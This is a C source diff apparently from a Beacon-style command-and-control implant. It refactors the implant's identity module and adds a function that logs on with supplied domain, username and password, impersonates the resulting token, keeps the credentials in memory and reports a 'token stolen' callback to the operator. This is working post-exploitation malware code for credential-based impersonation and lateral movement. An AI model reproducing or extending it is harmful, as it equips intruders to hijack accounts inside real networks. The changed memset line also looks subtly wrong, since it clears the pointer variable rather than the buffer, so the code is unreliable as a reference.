@@ -7,10 +7,11 @@
 
 HANDLE gIdentityToken;
 BOOL gIdentityIsLoggedIn;
-WCHAR gIdentityDomain[256];
-WCHAR gIdentityUsername[256];
-WCHAR gIdentityPassword[256];
-datap* gIdentityCredentialsFormat;
+
+WCHAR* gIdentityDomain;
+WCHAR* gIdentityUsername;
+WCHAR* gIdentityPassword;
+datap* gIdentityCredentialsParser;
 
 /**
  * Retrieves the username associated with the given token handle.
@@ -180,9 +181,9 @@ void BeaconRevertToken(void)
 	RevertToSelf();
 
 	// Free the memory allocated for the credentials format.
-	if (gIdentityCredentialsFormat) {
-		BeaconFormatFree(gIdentityCredentialsFormat);
-		memset(&gIdentityDomain, 0, sizeof(gIdentityDomain));
+	if (gIdentityCredentialsParser) {
+		BeaconFormatFree(gIdentityCredentialsParser);
+		memset(&gIdentityDomain, 0, IDENTITY_MAX_WCHARS_DOMAIN);
 	}
 }
 
@@ -211,4 +212,39 @@ BOOL BeaconIsAdmin(void)
 	// Free the allocated SID and return the result.
 	FreeSid(sid);
 	return isAdmin;
+}
+
+void IdentityLoginUserInternal(char* domain, char* username, char* password)
+{
+	BeaconRevertToken();
+	if(!LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &gIdentityToken))
+	{
+		int error = GetLastError();
+		LERROR("Could not create token: %s", LAST_ERROR_STR(error));
+		BeaconErrorD(ERROR_CREATE_TOKEN_FAILED, error);
+		return;
+	}
+
+	if (!ImpersonateLoggedOnUser(gIdentityToken))
+	{
+		int error = GetLastError();
+		LERROR("Failed to impersonate token: %s", LAST_ERROR_STR(error));
+		BeaconErrorD(ERROR_IMPERSONATE_TOKEN_FAILED, error);
+		return;
+	}
+
+	gIdentityCredentialsParser = BeaconDataAlloc(2048);
+	gIdentityDomain = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_DOMAIN * sizeof(WCHAR));
+	gIdentityUsername = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_USERNAME * sizeof(WCHAR));
+	gIdentityPassword = BeaconDataPtr(gIdentityCredentialsParser, IDENTITY_MAX_WCHARS_PASSWORD * sizeof(WCHAR));
+
+	toWideChar(domain, gIdentityDomain, IDENTITY_MAX_WCHARS_DOMAIN);
+	toWideChar(username, gIdentityUsername, IDENTITY_MAX_WCHARS_USERNAME);
+	toWideChar(password, gIdentityPassword, IDENTITY_MAX_WCHARS_PASSWORD);
+
+	gIdentityIsLoggedIn = TRUE;
+	if (IdentityGetUserInfo(gIdentityToken, (char*)username, 1024))
+	{
+		BeaconOutput(CALLBACK_TOKEN_STOLEN, username, strlen(username));
+	}
 }
